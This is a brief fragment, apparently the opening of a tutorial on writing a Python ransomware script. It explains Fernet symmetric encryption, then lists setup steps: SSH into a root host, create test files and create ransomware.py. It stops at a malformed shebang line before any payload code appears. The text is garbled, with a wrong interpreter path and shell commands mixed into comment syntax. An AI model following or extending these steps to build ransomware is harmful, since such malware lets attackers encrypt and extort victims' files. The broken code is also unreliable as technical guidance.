//Fernet - is a symmetric encryption method that guarantees that a message encrypted using it cannot be manipulated or read without the key. It uses URL safe codes encoding for the keys. Fernet also uses 128-bit AES.
//To test, create a ssh to a root host server
//Create some test files to test the ransomware. 
//Create the ransomware file:
nano ransomware.py //name of file 
#!/user/bin/env python 3 //file pathway bash script
